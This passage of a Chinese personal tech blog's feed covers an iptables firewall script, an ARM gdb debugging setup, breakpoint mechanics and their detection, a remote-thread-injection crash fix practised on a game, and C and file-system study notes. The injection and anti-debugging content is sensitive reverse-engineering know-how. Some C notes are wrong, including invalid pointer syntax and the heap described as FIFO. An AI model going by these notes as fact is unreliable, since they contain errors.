class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">iptables.sh</span></span><br><span class="line"></span><br><span class="line">set -v</span><br><span class="line">clear</span><br><span class="line">iptables -F</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ssh</span></span><br><span class="line">iptables -A INPUT  -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">http</span></span><br><span class="line"><span class="meta">#</span><span class="bash">https</span></span><br><span class="line">iptables -A OUTPUT -o eth0 -p tcp --dport 443 -j ACCEPT</span><br><span class="line">iptables -A INPUT -i eth0 -p tcp --sport 443 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ftp</span></span><br><span class="line">iptables -A OUTPUT -p tcp --dport 20 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --sport 20 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A OUTPUT -p tcp --dport 21 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --sport 21 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -P INPUT DROP  </span><br><span class="line">iptables -P FORWARD DROP  </span><br><span class="line">iptables -P OUTPUT DROP </span><br><span class="line"></span><br><span class="line">iptables -L -n --line-number</span><br></pre></td></tr></table></figure><h3 id="读后总结"><a href="#读后总结" class="headerlink" title="读后总结"></a>读后总结</h3><p>当然这些都是看上述文章一些浅显的,借鉴过来的知识.方便自己看hhh</p><h4 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h4><p>ipfirewall-&gt;ipchains-&gt;iptables</p><h4 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a>工作机制</h4><p>通过配置iptables,让内核空间当中的netfilter(网络过滤器)读取配置,并实让现防火墙工作.</p><p>为了实现过滤,要放在内核特定的位置,tcp/ip的协议栈经过的地方(netfilter).</p><p>1.PREROUTING (数据包进入路由前)</p><p>2.INPUT (通过路由表后目的为本机)</p><p>3.FORWARD (通过路由表后,目的地不为本机)</p><p>4.OUTPUT(由本机产生,向外转发)</p><p>5.POSTROUTING（发送到网卡接口之前）</p><p><img src="https://s1.51cto.com/attachment/201304/203657722.png" alt></p><p>现在目前只考虑到filter链上,然后forawrd用作nat转发暂时没有用到,以后可能还会接触到.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Linux" scheme="http://xwdidi.top/categories/Linux/"/>
    
    
      <category term="实验" scheme="http://xwdidi.top/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>arm环境搭建-gdb调试</title>
    <link href="http://xwdidi.top/2019/05/24/2019-05-24-arm%E7%8E%AF%E5%A2%83gdb%E8%B0%83%E8%AF%95/"/>
    <id>http://xwdidi.top/2019/05/24/2019-05-24-arm环境gdb调试/</id>
    <published>2019-05-24T05:33:23.000Z</published>
    <updated>2019-05-25T09:47:39.901Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p> 最近想学习一下arm指令集,恰好手边有一台多余的二手机.从MIUI刷成原生安卓终于能正常<code>adb push</code>了.</p><p>大多数的环境配置与调试是根据这篇文章<a href="http://www.tasfa.cn/index.php/2016/06/01/android-re-gdb/" target="_blank" rel="noopener">Android逆向系列之动态调试(五)–gdb调试</a>进行学习的.</p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>在这里我做一点补充和效率的提高.</p><ol><li><p>ndk的压缩包从这里<a href="https://developer.android.com/ndk/downloads?hl=zh-CN" target="_blank" rel="noopener">下载</a>.</p></li><li><p>我的压缩包解压后的文件名为<code>android-ndk-r19c</code></p><p>我是小米4的手机.</p></li><li><p>所以使用的gdbserver在<code>\android-ndk-r19c\prebuilt\android-arm\gdbserver</code></p><p>使用的调试编译的可执行文件如as.exe和ld.exe在<code>\android-ndk-r19c\toolchains\arm-linux-androideabi-4.9\prebuilt\windows-x86_64\arm-linux-androideabi\bin</code></p><p>gdb.exe在<code>F:\android_ndk\android-ndk-r19c\prebuilt\windows-x86_64\bin</code></p></li><li><p>已经把gdb.exe添加进环境变量中.</p><p>注意和gdb.exe同一个文件夹的python.exe,需要改名.不然会和自己的原来的python产生冲突.()</p></li><li><p>批处理</p></li></ol><p>​    我把调试的文件一律放在了/data/local/tmp/arm_p/中</p><p>​    然后这是自认为提高效率的东西.</p><p>这是文件树</p><p>​    <img src="https://i.loli.net/2019/05/24/5ce80487b3f5f27607.png" alt></p><p>以下是代码.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:: gdbserver.bat</span><br><span class="line"></span><br><span class="line">adb push pra/%1 /data/<span class="built_in">local</span>/tmp/arm_p</span><br><span class="line">adb shell chmod 777 /data/<span class="built_in">local</span>/tmp/arm_p/%1</span><br><span class="line">adb shell gdbserver :23946 /data/<span class="built_in">local</span>/tmp/arm_p/%1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:: start_gdb.bat</span><br><span class="line"></span><br><span class="line">adb forward tcp:23946 tcp:23946</span><br><span class="line">gdb -x gdb_script</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:: gdb_script</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> disassemble-next on</span><br><span class="line"><span class="built_in">set</span> step-mode on</span><br><span class="line">target remote 127.0.0.1:23946</span><br></pre></td></tr></table></figure><p>gdbserver.bat  上传文件,启动服务监听</p><p>start_gdb.bat  反汇编,单步调试</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="搭建" scheme="http://xwdidi.top/categories/%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="arm" scheme="http://xwdidi.top/tags/arm/"/>
    
      <category term="环境搭建" scheme="http://xwdidi.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>断点原理</title>
    <link href="http://xwdidi.top/2019/04/07/2019-04-07-%E6%96%AD%E7%82%B9%E5%8E%9F%E7%90%86/"/>
    <id>http://xwdidi.top/2019/04/07/2019-04-07-断点原理/</id>
    <published>2019-04-07T05:33:23.000Z</published>
    <updated>2019-05-24T15:08:01.071Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="CC断点"><a href="#CC断点" class="headerlink" title="CC断点"></a>CC断点</h3><p>F2断点.\</p><p>设置无数个.</p><p>将断下的指令地址处的第一个字节设置为0xCC</p><p>0xCC对应<code>int3</code>,专门用来调试的中断指令.</p><p>触发EXCEPTION_BREAKPOINT的异常,进行相应的处理</p><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>检测首地址是否为CCH</p><h3 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h3><p>或者是<code>PAGE_GUARD</code></p><blockquote><p>A: 内存访问断点，OD将目标内存所在的页面（范围圆整为1000h的倍数）设置为PAGE_NOACCESS，当被调试程序对这个内存进行任何“读、写或运行”操作时，都会触发异常。</p><p>B: 内存写入断点，OD将目标内存所在的页面（范围圆整为1000h的倍数）设置为PAGE_EXECUTE_READ，当被调试程序对这个内存进行“写”操作时触发异常。</p></blockquote><h4 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h4><p>我们使用VirtualProtectEx进行内存页修改,通过GetLastError获取到的值进行判断,进行相关处理</p><h4 id="反反内存断点"><a href="#反反内存断点" class="headerlink" title="反反内存断点"></a>反反内存断点</h4><p>VirtualQuery，VirtualQueryEx，VirtualProtect，VirtualProtectEx</p><h3 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h3><p>利用CPU自带的调试寄存器DR0-DR3设置硬件断点,产生SINGLE_STEP异常.</p><p>四个寄存器 最多四个断点.</p><p>DR7是控制位,控制断点方式.DR6显示断点原因</p><p><strong><a href="https://www.pediy.com/kssd/pediy06/pediy6751.htm" target="_blank" rel="noopener">学习大佬的文章</a></strong></p><h3 id="单步执行"><a href="#单步执行" class="headerlink" title="单步执行"></a>单步执行</h3><ul><li><ol><li>通过调试符号获取当前对应的行信息, 并保存该信息.</li><li>设置TF位, 开始CPU的单步执行,产生调试异常(int 1),中断到调试器</li><li>处理单步执行异常程序,TF置为0 </li></ol></li><li><p>执行源码调试,通过多次汇编一级的单步执行实现</p><p>通过符号文件判断是否为当行源码,若是的话,立即设置单步执行标志位继续执行,.直到ip不为当行源码.</p></li></ul><ul><li><p>程序分支</p><p>DbgCtl MSR寄存器的BTF标志,再设置TF.则可以执行到下一个分支指令触发调试异常</p></li></ul><ul><li><p>当指定任务被调度执行到中断调试器时. IA32CPU切换到一个新的任务时,检查存在于GDT中的TSS描述符的T标志位,若为1,啧产生调试异常</p><p>  TSS任务状态段</p><p>  <img src="https://i.loli.net/2019/04/11/5caf398fae53c.png" alt="TSS"></p><p>  切换进程更新动态字段:</p><ol><li>通用寄存器字段—任务切换之前，EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI寄存器状态。 </li><li>段选择符字段—任务切换之前，ES,CS,SS,DS,FS,GS寄存器保存的段选择符。 </li><li>EFLAGS寄存器字段—任务切换之前，EFAGS寄存器的状态。</li><li>EIP字段—任务切换之前，EIP寄存器的状态。</li><li>先前任务链接字段—包含先前任务的TSS的段选择符。该字段禁止任务通过使用IRET指令返回先前的任务。 </li></ol></li></ul><p>​     </p><p>​     </p><pre><code>等读完张银奎老师的软件调试再来做细致修改和改正    </code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="逆向分析" scheme="http://xwdidi.top/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
      <category term="断点" scheme="http://xwdidi.top/tags/%E6%96%AD%E7%82%B9/"/>
    
      <category term="调试" scheme="http://xwdidi.top/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>VC：执行远程线程注入的代码段导致目标进程崩溃</title>
    <link href="http://xwdidi.top/2019/04/01/2019-04-01-VC%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%A4%B1%E8%B4%A5/"/>
    <id>http://xwdidi.top/2019/04/01/2019-04-01-VC线程注入失败/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-04-07T04:36:27.147Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天使用植物大战僵尸练习线程注入调用call的时候,一直处于崩溃状态,,后来查阅了教程博客,下面有人指出了问题所在 在此引用下老哥的博客文章.</p><p><a href="https://blog.csdn.net/kk20078733/article/details/5530884" target="_blank" rel="noopener">原文地址</a></p><blockquote><p>以前也曾多次提到远程线程注入导致进程崩溃的现象。</p><p>此次崩溃不同于前几次。</p><p>之前，采用的是dll注入的方式，注入后，由于同一个dll文件在不同的进程中映射的基地址不同，导致远程线程函数的入口地址不同，以至崩溃，这种情况，多数是本进程采用静态链接加载待远程注入的dll文件，而其他进程则动态加载该dll文件，两次加载将在内存中产生两个dll实例。</p><p>此次，需要向远程进程注入代码段，远程线程函数入口地址正确。测试时，为了方便，特地增加了一个消息框MessageBox，远程线程函数仅仅调用这个弹出消息框的函数，然后退出。结果，消息框正常弹出，但是，当点击确定退出消息框后，目标进程立即崩溃。原因不明。</p><p>200807210756注：</p><p>实在不知道问题出哪儿了，于是就想看看注入的VC代码对应的反汇编代码，这时，忽然想到一点，即：我都是在Debug模式下执行的，这可能会有问题。</p><p>进一步思考。Debug版本和Release版本最大的不同在于，每次调用一个函数后，Debug版本会进行堆栈检测。而目标进程显然是处于release模式，此时，如果注入的是Debug版本的代码，那么，调用函数之后，会有一句检测堆栈的机器指令，这很可能就是进程崩溃的原因所在。</p><p>于是，改为release环境测试，一切正常！OK！</p><p>(我用控制台程序实现时没有问题，用MFC程序实现就有问题，因此发现以上内容，将Debug版改为Release版就没问题了)</p><p>另附上远程注入的主要代码段，供参考，有问题望指教！！！</p><p>作者：kk20078733<br>来源：CSDN<br>原文：<a href="https://blog.csdn.net/kk20078733/article/details/5530884" target="_blank" rel="noopener">https://blog.csdn.net/kk20078733/article/details/5530884</a> </p></blockquote><p>Debug版会使用一个检查堆栈平衡的函数_checkesp..</p><p>详细的在小黄书中有讲到.现在记得不是很清楚.</p><p>有机会的话会写上来.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="windows编程" scheme="http://xwdidi.top/categories/windows%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="错误整理" scheme="http://xwdidi.top/tags/%E9%94%99%E8%AF%AF%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>语言复习       查漏补缺 不定时更新</title>
    <link href="http://xwdidi.top/2019/03/15/2019-03-13-%E8%AF%AD%E8%A8%80%E8%A6%81%E7%82%B9%E5%A4%8D%E4%B9%A0/"/>
    <id>http://xwdidi.top/2019/03/15/2019-03-13-语言要点复习/</id>
    <published>2019-03-14T16:00:00.000Z</published>
    <updated>2019-04-07T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="语言要点复习"><a href="#语言要点复习" class="headerlink" title="语言要点复习"></a>语言要点复习</h1><h3 id="内存区域"><a href="#内存区域" class="headerlink" title="内存区域"></a>内存区域</h3><h4 id="bss段"><a href="#bss段" class="headerlink" title=".bss段"></a>.bss段</h4><p> (block started by symbol segmengt) 符号段块的起始位置</p><p>只存在于运行在内存中的可执行文件中.保存程序的起始地址和结束地址.不存在于硬盘的二进制文件中</p><p>因为一般用来存放未初始化的全局变量和静态变量,在程序之行开始时,这段区域的未初始化的都会被初始化为0,</p><p>以便内存区能在运行时分配并被有效地清零.不同架构可能有不同的方法.</p><p>.bss段从可执行文件中得到,链接器得到这个段大小的内存块,紧跟在数据段之后.</p><h4 id="data-段"><a href="#data-段" class="headerlink" title=".data 段"></a>.data 段</h4><p>data segment数据段,存放初始化好的全局变量,静态变量.</p><p>这个位置通常属于只读的.静态常量区.</p><p><code>char *a = &quot;Windows&quot;</code>,这个Windows字符串属于.data段,只读属性.如果运行<code>*a = &#39;a&#39;</code>会造成访问冲突.</p><p>大小在编译链接时自动分配.和全局变量,静态变量,常量有关</p><h3 id="rdata段"><a href="#rdata段" class="headerlink" title=".rdata段"></a>.rdata段</h3><p>包含导入和导出的导出函数信息,还可以存储程序御用的其他只读数据.</p><p>有些文件会包含.idata和.edata用来存储导入导出信息.</p><h3 id="pdata-段"><a href="#pdata-段" class="headerlink" title=".pdata 段"></a>.pdata 段</h3><p>只存在于64位pe文件中,存储异常信息</p><p>.bss+.data=静态存储区.存放静态变量 全局变量 常量(常变量,字符串常量)已经初始化,不可被修改</p><p>局部变量通过指针,引用访问和修改.</p><p>全局变量在静态存储区不可以被间接修改.</p><h4 id="text-段-code段"><a href="#text-段-code段" class="headerlink" title=".text 段 .code段"></a>.text 段 .code段</h4><p>VS中叫.text</p><p>borland的delphi使用.code</p><p>程序代码段, 存放二进制代码,编译后是静态不可变的.</p><p>为什么要设置这个段呢.程序语言文本是只读的,数据不是.每次加载代码,会固定加载到内存中.减少内存的使用,增加的内存的复用.</p><h4 id="stack-栈"><a href="#stack-栈" class="headerlink" title="stack 栈"></a>stack 栈</h4><p>堆栈,存放局部变量的区域,使用<code>push</code>指令压栈.调用函数执行<code>call</code>前,参数压栈,函数返回结果也会压栈放回.</p><p>VS默认栈为1M,64bits的linux栈默认10mb.</p><h4 id="heap-堆"><a href="#heap-堆" class="headerlink" title="heap 堆"></a>heap 堆</h4><p>FIFO的数据结构.用来保障函数内存分布.</p><p>malloc new 申请</p><p>free delete 删除对重指定信息</p><p>malloc 放回void* ,new返回类型指针,并执行构造函数</p><h3 id="rsrc"><a href="#rsrc" class="headerlink" title=".rsrc"></a>.rsrc</h3><p>包含可执行文件所使用的资源.图标\图片\菜单项\字符串</p><p>在.rsrc中经常存储的字符串,是为了提供多语种的支持.</p><h3 id="reloc"><a href="#reloc" class="headerlink" title=".reloc"></a>.reloc</h3><p>包含重定位库文件的信息</p><h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><p>存储在静态存储区,在整个程序运行期间一直占据这些空间. 内存地址是不变的.不过不能在作用域外使用.</p><p>所有全局变量都是静态变量,而局部变量只有定义时加上static修饰符,才能成为局部静态变量.</p><p>不会随着函数的启动和结束而消失.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strA</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> str[] = <span class="string">"hello"</span>;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strA</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str* = <span class="string">"hello"</span>;<span class="comment">//字符串位于常量区,处于静态存储区.生命周期内恒定不变的.无法被改变</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h4><p><code>int c[2][3]</code> 表示数组c有两组3个数字的数组.</p><p><code>c</code>表示数组首地址 表示的是二维数组行指针</p><p><code>*c</code>第一行元素的首地址,是一维指针,是二维数组的列指针.</p><p><code>**c</code>取第一个元素的值.</p><p><code>char (*str)[20]</code>数组指针.执行数组元素的指针</p><p><code>char *str[20]</code>指针数组,数组成员为<code>char *</code>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> *p=arr;<span class="comment">//首个元素的首地址</span></span><br><span class="line">    </span><br><span class="line">    *(p++)+=<span class="number">123</span>;<span class="comment">//计算完成后 指向第二个元素</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d,%d\n"</span>, *p,*(++p)); <span class="comment">//参数从左往右看,此时p指向第三个元素</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是没有返回值,没有参数的函数</p><p><code>void f(void)</code></p><p>这是一个指向函数的指针,该函数没有返回值和参数</p><p><code>void(*p)(void)</code></p><p>上述指针的类型</p><p><code>void (*)(void)</code></p><p>对该类型的强制转换</p><p><code>(void (*)(void))</code></p><p>对该类型的强制转换</p><p><code>(void (*)(void))0</code></p><h4 id="让程序跳转到绝对地址是0x100000去执行"><a href="#让程序跳转到绝对地址是0x100000去执行" class="headerlink" title="让程序跳转到绝对地址是0x100000去执行"></a>让程序跳转到绝对地址是0x100000去执行</h4><p><code>((void (*)())0x100000)()</code></p><h3 id="const-static"><a href="#const-static" class="headerlink" title="const static"></a>const static</h3><h4 id="先说const"><a href="#先说const" class="headerlink" title="先说const"></a>先说const</h4><p>const 是表示常量的标识符.</p><p>const char * A  A指针指向的变量是不可变的</p><p>char const *A    和上述一样</p><p>char *const A    指针本身是不可变的,所以必须被初始化.而变量可以改变</p><h4 id="static-标识符"><a href="#static-标识符" class="headerlink" title="static 标识符"></a>static 标识符</h4><ul><li><p>如果在全局变量加上static,被限定了作用域,只能在该源文件中使用.从而保证了在其他源文件中不被使用.只被初始化一次.</p><p>改变了作用域和使用范围</p></li><li><p>给局部变量加上的static的话,在局部函数结束后不会消失,且是最新的状态.</p><p>只被初始化一次</p><p>(编译器在该目标编译单元内只有该函数的入口地址,没有函数名,其他编译单元不能通过函数名调用该函数,)</p><p>随着程序结束而消失</p></li><li><p>static函数在内存中只存在一份,普通函数存在复数拷贝</p></li><li><p>类的成员函数中加上,该类的对象同时共用这一个成员函数,成员变量也是.</p></li></ul><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><p>多态:<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E5%9E%8B_(%E7%89%A9%E4%BB%B6%E5%B0%8E%E5%90%91%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88" target="_blank" rel="noopener">多态</a>)（Polymorphism）是指由继承而产生的相关的不同的类，其对象对同一消息会做出不同的响应<a href="https://zh.wikipedia.org/wiki/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1#cite_note-8" target="_blank" rel="noopener">[8]</a></p><p><a href="https://zh.wikipedia.org/wiki/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1</a></p><p>很有意思的讲解</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="操作系统" scheme="http://xwdidi.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="复习" scheme="http://xwdidi.top/tags/%E5%A4%8D%E4%B9%A0/"/>
    
      <category term="基础" scheme="http://xwdidi.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>设备驱动与文件系统   L30 文件使用的磁盘的实现</title>
    <link href="http://xwdidi.top/2019/03/04/2019-03-04-L30-%E6%96%87%E4%BB%B6%E4%BD%BF%E7%94%A8%E7%A3%81%E7%9B%98%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <id>http://xwdidi.top/2019/03/04/2019-03-04-L30-文件使用磁盘的实现/</id>
    <published>2019-03-03T16:00:00.000Z</published>
    <updated>2019-04-06T13:57:07.175Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="上文总结"><a href="#上文总结" class="headerlink" title="上文总结"></a>上文总结</h2><p>从字符流算出盘块号</p><p>使用映射表算出.</p><h2 id="重点总结"><a href="#重点总结" class="headerlink" title="重点总结"></a>重点总结</h2><p><code>fs/read_write.c</code></p><p><img src="https://i.loli.net/2019/03/04/5c7d2647b2806.jpg" alt></p><p>参数分别是文件描述符,缓冲区,读写字符的个数.处理字符流的一段</p><p>获得inode(FCB),根据字符流的位置算出盘块号,读就完事了.</p><p>给出inode,file,缓冲区,长度, 运行file_write,取出对应盘块号的信息放入队列中,进行修改,再存入.</p><p>,</p><p>,</p><h3 id="file-write的工作流程"><a href="#file-write的工作流程" class="headerlink" title="file_write的工作流程"></a>file_write的工作流程</h3><p>(1)首先需要知道是些哪段字符？<br>file中一个读写指针，是开始地址（fseek就是修改它），再加正count</p><p><img src="https://i.loli.net/2019/03/04/5c7d359eedac2.jpg" alt></p><p><code>filp-&gt;f_pops</code>为读写位置,不断累加.追加指针放到文件末尾或者从中读取放到上一次读写的位置.</p><p>根据读写位置找到盘块号.读取到内存缓冲区,放到电梯队列上阻塞.读写完成后后pos增加,文件指针往后挪动</p><p>（2）找到要写的盘块号？<br>inode就是用来干这事的</p><p><img src="https://i.loli.net/2019/03/04/5c7d3967a4d57.jpg" alt></p><p>2^16*1024= 65536kb</p><p>一页索引1024,一个盘块号2个字节,只能表示512索引块.</p><p>根据读写的位置除以每一个读写的位置,字符流的位置除以表示每个块的大小,在哪个段上,再查证映射表对应的盘块号.再使用bread发出磁盘读写</p><p>添加new_block,需要先读入索引块确定正确位置</p><p>inode可以存放映射表,对于特殊文件可以存放设备号等信息</p><p>（3）用盘块号、buf等形<br>成request放入“电梯”</p><p><img src="https://i.loli.net/2019/03/04/5c7d3a8119558.jpg" alt></p><p>i_mode字符文件</p><p>i_zone是存放映射关系的,现在可以用来存放设备号</p><p>通过inode得到文件视图,如何打开文件</p><p>fd = open()<br>read(fd,…)</p><h4 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h4><p>从路径名/文件名找到inode,inode找到盘块号,盘块号放到电梯队列,根据盘块号算出chs,</p><p>根据out指令发出到磁盘控制器,驱动马达 电生磁 磁生电形成数据.</p><p><img src="https://i.loli.net/2019/03/05/5c7d5aba2d9a2.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="操作系统" scheme="http://xwdidi.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://xwdidi.top/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="驱动" scheme="http://xwdidi.top/tags/%E9%A9%B1%E5%8A%A8/"/>
    
      <category term="I/O" scheme="http://xwdidi.top/tags/I-O/"/>
    
  </entry>
  
  <entry>
    <title>设备驱动与文件系统    L29 从生磁盘到文件</title>
    <link href="http://xwdidi.top/2019/02/19/2019-02-19-L29-%E4%BB%8E%E7%94%9F%E7%A3%81%E7%9B%98%E5%88%B0%E6%96%87%E4%BB%B6/"/>
    <id>http://xwdidi.top/2019/02/19/2019-02-19-L29-从生磁盘到文件/</id>
    <published>2019-02-18T16:00:00.000Z</published>
    <updated>2019-04-06T13:56:53.862Z</updated>
    
